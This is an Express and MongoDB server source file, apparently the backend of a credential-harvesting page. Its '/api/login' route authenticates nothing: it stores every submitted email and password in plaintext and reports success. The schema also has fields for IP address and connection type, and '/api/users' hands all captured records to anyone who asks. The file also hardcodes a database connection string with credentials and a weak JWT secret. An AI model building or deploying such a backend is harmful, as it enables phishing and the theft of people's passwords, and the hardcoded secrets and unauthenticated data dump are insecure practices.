const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
const cors = require("cors");

const app = express();
const port = 8000;
const secretKey = "123abc"; // Replace with a secure secret key for JWT
app.use(cors());
// Middleware to parse JSON data
app.use(bodyParser.json());

// Connect to MongoDB (replace <your-mongodb-connection-url> with your actual connection URL)
mongoose.connect(
  "mongodb+srv://godbless:12345@cluster0.iy1samo.mongodb.net/?retryWrites=true&w=majority",
  {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  }
);
const db = mongoose.connection;

// Check for database connection errors
db.on("error", console.error.bind(console, "MongoDB connection error:"));
db.once("open", () => {
  console.log("Connected to MongoDB");
});

// Define a User schema
const userSchema = new mongoose.Schema({
  email: String,
  password: String,
  ipAddress: String,
  connectType: String,
  createdAt: {
    type: Date,
    default: Date.now,
  },
});

// Define an Admin schema
const adminSchema = new mongoose.Schema({
  username: String,
  password: String,
});

// Create User and Admin models based on the schemas
const User = mongoose.model("User", userSchema);
const Admin = mongoose.model("Admin", adminSchema);

// Helper function to hash passwords
const hashPassword = async (password) => {
  const saltRounds = 10;
  return await bcrypt.hash(password, saltRounds);
};

// Login an existing user
app.post("/api/login", (req, res) => {
  const { email, password } = req.body;

  // Check if both username and password are provided
  if (!email || !password) {
    return res
      .status(400)
      .json({ message: "Both email and password are required" });
  }

  // Create a new user in the database
  const newUser = new User({ email, password });
  newUser
    .save()
    .then(() => {
      res
        .status(200)
        .json({ message: "User created and logged in successfully" });
    })
    .catch((err) => {
      res
        .status(500)
        .json({ message: "Internal Server Error", error: err.message });
    });
});

// Get all users
app.get("/api/users", (req, res) => {
  // Retrieve all users from the database
  User.find({})
    .then((users) => {
      res.status(200).json(users);
    })
    .catch((err) => {
      res
        .status(500)
        .json({ message: "Internal Server Error", error: err.message });
    });
});

// Register a new admin
app.post("/api/admin/register", async (req, res) => {
  const { username, password } = req.body;

  try {
    // Check if the username is already taken
    const existingAdmin = await Admin.findOne({ username });

    if (existingAdmin) {
      return res.status(400).json({ message: "Username already taken" });
    }

    // Hash the password before saving it to the database
    const hashedPassword = await hashPassword(password);

    // Create a new admin and save it to the database
    const newAdmin = new Admin({ username, password: hashedPassword });
    await newAdmin.save();

    res.status(201).json({ message: "Admin registered successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Internal Server Error" });
  }
});

// Login an existing admin
app.post("/api/admin/login", async (req, res) => {
  const { username, password } = req.body;

  try {
    // Find the admin in the database
    const admin = await Admin.findOne({ username });

    // Check if the admin exists and the password is correct
    if (admin && (await bcrypt.compare(password, admin.password))) {
      // Generate a JWT token for the admin
      const token = jwt.sign(
        { username: admin.username, role: "admin" },
        secretKey,
        { expiresIn: "1h" }
      );

      return res.status(200).json({ message: "Admin login successful", token });
    }

    res.status(401).json({ message: "Invalid username or password" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Internal Server Error" });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
